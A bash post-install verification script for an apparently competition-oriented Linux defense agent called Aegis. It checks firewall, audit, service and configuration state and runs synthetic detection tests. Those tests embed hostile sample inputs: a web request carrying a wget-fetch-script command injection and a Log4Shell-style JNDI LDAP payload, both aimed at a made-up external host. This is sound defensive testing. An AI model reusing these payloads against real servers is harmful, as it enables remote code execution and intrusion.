#!/usr/bin/env bash
set -euo pipefail

INSTALL_DIR="${AEGIS_INSTALL_DIR:-/opt/aegis-linux-defense-agent}"
CONFIG_DIR="${AEGIS_CONFIG_DIR:-/etc/aegis}"
STATE_DIR="${AEGIS_STATE_DIR:-/var/lib/aegis}"
LOG_DIR="${AEGIS_LOG_DIR:-/var/log/aegis}"
AGENT_CONFIG="${AEGIS_CONFIG:-${CONFIG_DIR}/agent.yaml}"
POLICY_CONFIG="${AEGIS_POLICY:-${CONFIG_DIR}/policy.yaml}"
CENTRAL_ENV="${CONFIG_DIR}/central.env"
PY="${INSTALL_DIR}/.venv/bin/python"
FAIL=0
PASS_COUNT=0
WARN_COUNT=0

pass() { echo "[PASS] $*"; PASS_COUNT=$((PASS_COUNT+1)); }
warn() { echo "[WARN] $*"; WARN_COUNT=$((WARN_COUNT+1)); }
fail() { echo "[FAIL] $*"; FAIL=$((FAIL+1)); }
check_cmd() { command -v "$1" >/dev/null 2>&1; }

read_central_env() {
  if [[ -f "$CENTRAL_ENV" ]]; then
    # shellcheck disable=SC1090
    source "$CENTRAL_ENV" || true
  fi
  AEGIS_CENTRAL_HOST="${AEGIS_CENTRAL_HOST:-127.0.0.1}"
  AEGIS_CENTRAL_PORT="${AEGIS_CENTRAL_PORT:-8088}"
  AEGIS_CENTRAL_TOKEN="${AEGIS_CENTRAL_TOKEN:-}"
}

wait_service() {
  local svc="$1" limit="${2:-20}"
  for _ in $(seq 1 "$limit"); do
    if systemctl is-active --quiet "$svc"; then
      return 0
    fi
    sleep 1
  done
  return 1
}

echo "== Aegis post-install competition check =="
read_central_env

if check_cmd python3; then pass "python3 installed"; else fail "python3 not found"; fi
if check_cmd nft; then pass "nftables command installed"; else fail "nft command not found"; fi
if check_cmd auditctl; then pass "auditd/auditctl installed"; else warn "auditctl not found; auditd checks limited"; fi
if check_cmd curl; then pass "curl installed"; else fail "curl not found"; fi

if [[ -x "$PY" ]]; then
  pass "Aegis venv python exists"
else
  fail "Aegis venv python missing: $PY"
fi

if [[ -d "$INSTALL_DIR/src/aegis_agent" && -d "$INSTALL_DIR/src/aegis_central" ]]; then
  pass "Aegis source installed"
else
  fail "Aegis source directory incomplete: $INSTALL_DIR"
fi

if [[ -f "$AGENT_CONFIG" ]]; then pass "agent config exists: $AGENT_CONFIG"; else fail "agent config missing: $AGENT_CONFIG"; fi
if [[ -f "$POLICY_CONFIG" ]]; then pass "policy config exists: $POLICY_CONFIG"; else fail "policy config missing: $POLICY_CONFIG"; fi

if [[ -x "$PY" ]]; then
  export PYTHONPATH="$INSTALL_DIR/src:$INSTALL_DIR${PYTHONPATH:+:$PYTHONPATH}"
  if "$PY" - <<'PY' >/dev/null 2>&1
import aegis_agent, aegis_central
print(aegis_agent.__version__)
PY
  then
    pass "Python package import works"
  else
    fail "Python package import failed"
  fi
fi

if [[ -x "$PY" && -f "$AGENT_CONFIG" && -f "$POLICY_CONFIG" ]]; then
  CFG_OUT="$($PY - "$AGENT_CONFIG" "$POLICY_CONFIG" <<'PY' 2>/tmp/aegis_post_check_yaml.err || true
import sys, yaml, os, stat
agent=yaml.safe_load(open(sys.argv[1])) or {}
policy=yaml.safe_load(open(sys.argv[2])) or {}
p=policy.get('policy', policy)
enf=agent.get('enforcement', {})
ai=agent.get('ai', {})
dr=agent.get('drone', {})
growth=agent.get('security_growth', {})
allow=p.get('allowlists', {})
print('dry_run=' + str(enf.get('dry_run')))
print('require_cli_enable_flag=' + str(enf.get('require_cli_enable_flag')))
print('prefer_backend=' + str(enf.get('prefer_backend')))
print('ai_provider=' + str(ai.get('provider')))
print('api_key_file=' + str(ai.get('api_key_file', '')))
print('drone_enabled=' + str(dr.get('enabled')))
print('security_growth_enabled=' + str(growth.get('enabled')))
print('signature_patterns_enabled=' + str(agent.get('signature_patterns', {}).get('enabled')))
print('loop_process_enabled=' + str(agent.get('loop_process', {}).get('enabled')))
print('vulnerability_guard_enabled=' + str(agent.get('vulnerability_guard', {}).get('enabled')))
print('suspend_process_enabled=' + str(p.get('actions', {}).get('suspend_process', {}).get('enabled')))
print('allow_ips=' + ','.join(map(str, allow.get('ips', []))))
print('allow_cidrs=' + ','.join(map(str, allow.get('cidrs', []))))
PY
)"
  echo "$CFG_OUT" | grep -q 'dry_run=False' && pass "real enforcement enabled: dry_run=false" || fail "dry_run is not false"
  echo "$CFG_OUT" | grep -q 'require_cli_enable_flag=False' && pass "service can enforce without manual CLI flag" || fail "require_cli_enable_flag is not false"
  echo "$CFG_OUT" | grep -q 'prefer_backend=nftables' && pass "nftables backend selected" || fail "nftables backend not selected"
  echo "$CFG_OUT" | grep -q 'drone_enabled=True' && pass "drone network guard enabled" || warn "drone network guard not enabled"
  echo "$CFG_OUT" | grep -q 'security_growth_enabled=True' && pass "security growth loop enabled" || warn "security growth loop not enabled"
  echo "$CFG_OUT" | grep -q 'signature_patterns_enabled=True' && pass "signature pattern loop enabled" || warn "signature pattern loop not enabled"
  echo "$CFG_OUT" | grep -q 'loop_process_enabled=True' && pass "loop process audit trail enabled" || warn "loop process audit trail not enabled"
echo "$CFG_OUT" | grep -q 'vulnerability_guard_enabled=True' && pass "vulnerability attack guard enabled" || warn "vulnerability attack guard not enabled"
  echo "$CFG_OUT" | grep -q 'suspend_process_enabled=False' && pass "suspend_process disabled by competition default" || fail "suspend_process should be disabled by default for competition safety"
  echo "$CFG_OUT" | grep -q '127.0.0.1' && pass "127.0.0.1 allowlisted" || fail "127.0.0.1 missing from allowlist"
  echo "$CFG_OUT" | grep -q '::1' && pass "::1 allowlisted" || fail "::1 missing from allowlist"
  if echo "$CFG_OUT" | grep -Eq 'allow_cidrs=.*(10\.0\.0\.0/8|172\.16\.0\.0/12|192\.168\.0\.0/16)'; then
    fail "private CIDR allowlist is present; competition attackers may bypass blocking"
  else
    pass "private CIDR allowlist removed"
  fi
  API_KEY_FILE="$(echo "$CFG_OUT" | sed -n 's/^api_key_file=//p' | head -1)"
  if [[ -z "$API_KEY_FILE" ]]; then
    API_KEY_FILE="${CONFIG_DIR}/secrets/openai_api_key"
  fi
  if [[ -e "$API_KEY_FILE" ]]; then
    mode="$(stat -c '%a' "$API_KEY_FILE" 2>/dev/null || echo unknown)"
    [[ "$mode" == "600" ]] && pass "API key file exists with mode 600" || fail "API key file mode is $mode, expected 600"
    if [[ -s "$API_KEY_FILE" ]]; then pass "API key file is non-empty; GPT mode available"; else warn "API key file is empty; rule_based mode may be used"; fi
  else
    fail "API key file missing: $API_KEY_FILE"
  fi
fi

if systemctl is-enabled --quiet nftables 2>/dev/null; then pass "nftables service enabled"; else warn "nftables service not enabled"; fi
if systemctl is-active --quiet nftables 2>/dev/null; then pass "nftables service active"; else fail "nftables service not active"; fi
if systemctl is-active --quiet auditd 2>/dev/null || systemctl is-active --quiet audit 2>/dev/null; then pass "auditd service active"; else warn "auditd service not active"; fi

if nft list table inet aegis_guard >/dev/null 2>&1; then
  pass "nftables table inet aegis_guard exists"
else
  fail "nftables table inet aegis_guard missing"
fi
for setname in block_in_v4 block_out_v4 rate_limit_v4 block_in_v6 block_out_v6 rate_limit_v6; do
  if nft list set inet aegis_guard "$setname" >/dev/null 2>&1; then
    pass "nftables set exists: $setname"
  else
    fail "nftables set missing: $setname"
  fi
done

TEST_IP="198.51.100.77"
if nft add element inet aegis_guard block_in_v4 "{ $TEST_IP timeout 5s }" >/tmp/aegis_nft_add.out 2>/tmp/aegis_nft_add.err; then
  if nft list set inet aegis_guard block_in_v4 | grep -q "$TEST_IP"; then
    pass "nftables real add/delete validation path works"
  else
    fail "nftables test element add did not appear"
  fi
  nft delete element inet aegis_guard block_in_v4 "{ $TEST_IP }" >/dev/null 2>&1 || true
else
  fail "nftables test element add failed: $(cat /tmp/aegis_nft_add.err 2>/dev/null)"
fi


# Invalid/wildcard firewall target safety check. This prevents parser mistakes such as 0.0.0.0 outbound blocks.
if [[ -x "$PY" ]]; then
  if "$PY" - <<'PYSAFE' >/tmp/aegis_invalid_target_check.json 2>/tmp/aegis_invalid_target_check.err
import json
from aegis_agent.executors.network_guard import NetworkGuard
from aegis_agent.models import ActionPlan
res = NetworkGuard(dry_run=False, backend='memory', config={'require_root': False}).execute(
    ActionPlan('ACT-SAFE', 'block_outbound_ip', '0.0.0.0', 'invalid-target-test', ['E-SAFE'], 100, ttl_seconds=60)
)
print(json.dumps(res.to_dict()))
PYSAFE
  then
    if grep -q 'invalid_ip' /tmp/aegis_invalid_target_check.json || grep -q 'Unsafe or invalid' /tmp/aegis_invalid_target_check.json; then
      pass "invalid wildcard firewall target rejected"
    else
      fail "0.0.0.0 firewall target was not rejected: $(cat /tmp/aegis_invalid_target_check.json 2>/dev/null)"
    fi
  else
    fail "invalid target safety check failed: $(cat /tmp/aegis_invalid_target_check.err 2>/dev/null)"
  fi
fi

if auditctl -l 2>/dev/null | grep -qi aegis; then pass "auditd aegis rules installed"; else warn "aegis auditd rules not visible"; fi

if wait_service aegis-central.service 20; then pass "aegis-central active"; else fail "aegis-central not active"; fi
if wait_service aegis-agent.service 20; then pass "aegis-agent active"; else fail "aegis-agent not active"; fi

# Central health check. Prefer loopback even when service binds 0.0.0.0.
if [[ -n "$AEGIS_CENTRAL_TOKEN" ]]; then
  if curl -fsS -H "Authorization: Bearer $AEGIS_CENTRAL_TOKEN" "http://127.0.0.1:${AEGIS_CENTRAL_PORT}/api/health" >/tmp/aegis_central_health.json 2>/tmp/aegis_central_health.err; then
    pass "central health API reachable with token"
  else
    fail "central health API failed: $(cat /tmp/aegis_central_health.err 2>/dev/null)"
  fi
else
  warn "central token unavailable; skipping authenticated health check"
fi

# CLI action/incident reads prove module path and DB are usable.
if [[ -x "$PY" ]]; then
  export PYTHONPATH="$INSTALL_DIR/src:$INSTALL_DIR${PYTHONPATH:+:$PYTHONPATH}"
  cd "$INSTALL_DIR"
  if "$PY" -m aegis_agent actions --config "$AGENT_CONFIG" --limit 5 >/tmp/aegis_actions_check.json 2>/tmp/aegis_actions_check.err; then
    pass "aegis_agent actions CLI works"
  else
    fail "aegis_agent actions CLI failed: $(cat /tmp/aegis_actions_check.err 2>/dev/null)"
  fi
  if "$PY" -m aegis_agent incidents --config "$AGENT_CONFIG" --limit 5 >/tmp/aegis_incidents_check.json 2>/tmp/aegis_incidents_check.err; then
    pass "aegis_agent incidents CLI works"
  else
    fail "aegis_agent incidents CLI failed: $(cat /tmp/aegis_incidents_check.err 2>/dev/null)"
  fi
fi

# Passive drone detection path check without executing defense actions.
if [[ -x "$PY" && -f "$AGENT_CONFIG" ]]; then
  if "$PY" - "$AGENT_CONFIG" <<'PY' >/tmp/aegis_drone_check.json 2>/tmp/aegis_drone_check.err
import json, sys, yaml, tempfile, pathlib
from aegis_agent.collectors.drone import collect_drone_events
from aegis_agent.evidence.builder import build_evidence_chains
cfg=yaml.safe_load(open(sys.argv[1])) or {}
d=cfg.get('drone', {}).copy()
with tempfile.TemporaryDirectory() as td:
    p=pathlib.Path(td)/'drone_mavlink.log'
    p.write_text('SRC=198.51.100.88 DST=192.168.13.20 DPT=14550 MAVLINK MSG=COMMAND_LONG SYSID=255 COMPID=1\n')
    d['logs']=[str(p)]
    d['collect_live_ss']=False
    d['enabled']=True
    events=collect_drone_events(d, state_dir=td, follow=False)
    chains=build_evidence_chains(events)
print(json.dumps({'events': len(events), 'chains': len(chains), 'types': [e.event_type for e in events]}))
PY
  then
    if grep -q 'drone_command_attempt' /tmp/aegis_drone_check.json; then
      pass "drone passive detection path works"
    else
      fail "drone passive detection did not produce command attempt"
    fi
  else
    fail "drone detection check failed: $(cat /tmp/aegis_drone_check.err 2>/dev/null)"
  fi
fi

# Signature pattern loop sanity check without executing defense actions.
if [[ -x "$PY" ]]; then
  if "$PY" - <<'PY' >/tmp/aegis_signature_check.json 2>/tmp/aegis_signature_check.err
import json, time
from aegis_agent.models import Event, new_id
from aegis_agent.core.signature_engine import SignaturePatternEngine
from aegis_agent.evidence.builder import build_evidence_chains
from aegis_agent.ai.rule_engine import analyze_chain
ev=Event(new_id('E'), time.time(), 'access.log', 'http_request', 'test-host', 'low', '198.51.100.44 - - [x] "GET /?cmd=wget%20http://45.77.1.2/x.sh HTTP/1.1" 200 1', src_ip='198.51.100.44', uri='/?cmd=wget%20http://45.77.1.2/x.sh')
sigs=SignaturePatternEngine({'enabled': True, 'load_defaults': True}).evaluate([ev])
chains=build_evidence_chains([ev]+sigs)
analysis=analyze_chain(chains[0])
print(json.dumps({'signature_events': len(sigs), 'score': chains[0].score, 'actions': [a['action'] for a in analysis.recommended_actions]}))
PY
  then
    if grep -q 'block_ip_ttl' /tmp/aegis_signature_check.json; then
      pass "signature pattern loop creates block action"
    else
      fail "signature pattern loop did not create block action: $(cat /tmp/aegis_signature_check.json 2>/dev/null)"
    fi
  else
    fail "signature pattern check failed: $(cat /tmp/aegis_signature_check.err 2>/dev/null)"
  fi
fi

# SSH scoring/action sanity check without executing defense actions.
if [[ -x "$PY" ]]; then
  if "$PY" - <<'PY' >/tmp/aegis_ssh_check.json 2>/tmp/aegis_ssh_check.err
import json, time
from aegis_agent.models import Event, new_id
from aegis_agent.evidence.builder import build_evidence_chains
from aegis_agent.ai.rule_engine import analyze_chain
now=time.time()
events=[Event(new_id('E'), now+i, 'synthetic-auth', 'ssh_failed_login', 'test-host', 'medium', 'Failed password', src_ip='198.51.100.99', user='root') for i in range(10)]
chains=build_evidence_chains(events)
analysis=analyze_chain(chains[0])
print(json.dumps({'score': chains[0].score, 'actions': [a['action'] for a in analysis.recommended_actions]}))
PY
  then
    if grep -q 'block_ip_ttl' /tmp/aegis_ssh_check.json; then
      pass "SSH brute-force scoring creates block action"
    else
      fail "SSH brute-force scoring did not create block action: $(cat /tmp/aegis_ssh_check.json 2>/dev/null)"
    fi
  else
    fail "SSH scoring check failed: $(cat /tmp/aegis_ssh_check.err 2>/dev/null)"
  fi
fi


# Vulnerability attack guard and RCE false-positive sanity checks.
if [[ -x "$PY" ]]; then
  if "$PY" - <<'PYVULN' >/tmp/aegis_vuln_guard_check.json 2>/tmp/aegis_vuln_guard_check.err
import json, time
from aegis_agent.models import Event, new_id
from aegis_agent.core.signature_engine import SignaturePatternEngine
from aegis_agent.core.vulnerability_guard import VulnerabilityAttackGuard
from aegis_agent.evidence.builder import build_evidence_chains
from aegis_agent.ai.rule_engine import analyze_chain
benign = Event(new_id('E'), time.time(), 'access.log', 'http_request', 'test-host', 'low', '198.51.100.11 - - [x] "GET /index.html HTTP/1.1" 200 1 "-" "curl/8.0"', src_ip='198.51.100.11', uri='/index.html')
sigs_benign = SignaturePatternEngine({'enabled': True, 'load_defaults': True}).evaluate([benign])
rce_benign = [e for e in sigs_benign if (e.metadata or {}).get('category') == 'web_rce']
attack = Event(new_id('E'), time.time(), 'access.log', 'http_request', 'test-host', 'low', '198.51.100.12 - - [x] "GET /?x=${jndi:ldap://45.77.1.2/a} HTTP/1.1" 400 1', src_ip='198.51.100.12', uri='/?x=${jndi:ldap://45.77.1.2/a}')
sigs = SignaturePatternEngine({'enabled': True, 'load_defaults': True}).evaluate([attack])
vuln = VulnerabilityAttackGuard({'enabled': True}).evaluate([attack] + sigs)
chains = build_evidence_chains([attack] + sigs + vuln)
analysis = analyze_chain(chains[0])
print(json.dumps({'benign_rce_sigs': len(rce_benign), 'vuln_events': len(vuln), 'actions': [a['action'] for a in analysis.recommended_actions]}))
PYVULN
  then
    if grep -q '"benign_rce_sigs": 0' /tmp/aegis_vuln_guard_check.json && grep -q 'block_ip_ttl' /tmp/aegis_vuln_guard_check.json; then
      pass "vulnerability guard blocks known exploit and RCE signature avoids bare curl overmatch"
    else
      fail "vulnerability/RCE signature sanity check failed: $(cat /tmp/aegis_vuln_guard_check.json 2>/dev/null)"
    fi
  else
    fail "vulnerability guard check failed: $(cat /tmp/aegis_vuln_guard_check.err 2>/dev/null)"
  fi
fi

# v0.2.11 AI duel demo/proof tool sanity check. Safe synthetic telemetry + memory backend only.
if [[ -x "$PY" && -f "$AGENT_CONFIG" && -f "$POLICY_CONFIG" ]]; then
  rm -rf /tmp/aegis_ai_duel_check
  if "$PY" -m aegis_agent duel-demo --config "$AGENT_CONFIG" --policy "$POLICY_CONFIG" --output-dir /tmp/aegis_ai_duel_check >/tmp/aegis_duel_check.json 2>/tmp/aegis_duel_check.err; then
    if [[ -s /tmp/aegis_ai_duel_check/reports/proof_report.md && -s /tmp/aegis_ai_duel_check/ai_reasoning_ledger.jsonl ]]; then
      pass "AI duel demo and proof generator work"
    else
      fail "AI duel demo did not create proof artifacts"
    fi
  else
    fail "AI duel demo check failed: $(cat /tmp/aegis_duel_check.err 2>/dev/null)"
  fi
fi

# Reasoning ledger CLI sanity check.
if [[ -x "$PY" ]]; then
  if "$PY" -m aegis_agent reasoning-ledger --config "$AGENT_CONFIG" --limit 5 >/tmp/aegis_ledger_cli.json 2>/tmp/aegis_ledger_cli.err; then
    pass "AI reasoning ledger CLI works"
  else
    fail "AI reasoning ledger CLI failed: $(cat /tmp/aegis_ledger_cli.err 2>/dev/null)"
  fi
fi



# v0.2.15 Championship Mode provider priority and policy promotion sanity checks.
if [[ -x "$PY" && -f "$AGENT_CONFIG" ]]; then
  if "$PY" -m aegis_agent championship-status --config "$AGENT_CONFIG" --limit 10 --summary >/tmp/aegis_championship_status.json 2>/tmp/aegis_championship_status.err; then
    if grep -q '"championship_mode": true' /tmp/aegis_championship_status.json; then
      pass "championship mode status CLI works"
    else
      fail "championship status did not report championship mode"
    fi
  else
    fail "championship status CLI failed: $(cat /tmp/aegis_championship_status.err 2>/dev/null)"
  fi
  if grep -q 'provider_priority' "$AGENT_CONFIG" && grep -q 'policy_promotion' "$AGENT_CONFIG"; then
    pass "GPT -> Ollama/Llama -> rule_based priority and policy promotion configured"
  else
    fail "AI provider priority or policy promotion config missing"
  fi
fi

# AI/GPT connectivity preflight is advisory and does not fail the defensive installation.
if [[ -x "${INSTALL_DIR}/scripts/diagnose_ai_connectivity.sh" ]]; then
  "${INSTALL_DIR}/scripts/diagnose_ai_connectivity.sh" "${AGENT_CONFIG}" >/tmp/aegis_ai_diag.out 2>/tmp/aegis_ai_diag.err || true
  if grep -qi "rule fallback used\|certificate verify\|missing_api_key" /tmp/aegis_ai_diag.out /tmp/aegis_ai_diag.err 2>/dev/null; then
    warn "AI/GPT preflight reported fallback or TLS/API issue; rule_based fallback remains available"
  else
    pass "AI/GPT preflight completed without obvious fallback warning"
  fi
fi

echo
if [[ "$FAIL" -eq 0 ]]; then
  echo "[Aegis] POST-INSTALL CHECK RESULT: PASS (${PASS_COUNT} passed, ${WARN_COUNT} warnings)"
  exit 0
fi

echo "[Aegis] POST-INSTALL CHECK RESULT: FAIL (${FAIL} failed, ${PASS_COUNT} passed, ${WARN_COUNT} warnings)"
echo "[Aegis] Review: sudo journalctl -u aegis-agent -n 200 --no-pager"
echo "[Aegis] Emergency stop: sudo ${INSTALL_DIR}/scripts/aegis_competition_emergency_stop.sh"
exit 1
